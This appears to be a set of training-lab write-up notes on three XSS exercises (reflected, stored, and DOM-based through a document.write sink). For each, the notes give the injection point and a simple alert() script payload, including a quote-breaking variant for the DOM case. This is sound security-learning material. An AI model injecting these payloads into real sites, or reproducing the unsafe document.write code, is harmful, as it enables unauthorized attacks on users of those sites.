### 1. Reflected XSS into HTML context with nothing encoded
**Vulnerable Parameter/Location:** Search field<br>
Reflection Point is given below.
```html
<h1>0 search results for '11111'</h1>
```
**Payload Used:** <script>alert()</script>
### 2. Stored XSS into HTML context with nothing encoded
**Vulnerable Parameter/Location:** Comment field<br>
Reflection Point is given below.
```html
<p>11111</p>
```
**Payload Used:** <script>alert()</script>
3. DOM XSS in document.write sink using source location.search
**Vulnerable Parameter/Location:** Search field<br>
User's input is getting reflected back in DOM at two places as given below.
```html
<h1>0 search results for '111111'</h1>
```
```html
<img src="/resources/images/tracker.gif?searchTerms=111111">
```
First reflection point in <h1> is also visible when we view Source code, but the second one is not visible in source code. The second one is visible only via Inspect Element. Means for second we can try DOM based XSS. Lets view the source code to check for any vulnerable javascript that might be generating the link in second reflection point
```js
function trackSearch(query) {
	document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if (query) {
	trackSearch(query);
}
```
Nice, means we can use the below payload to execute XSS. In the above js code query parameter would be replaced by user's input. So the final payload would be.<br>
**Payload**: "><script>alert()</script>

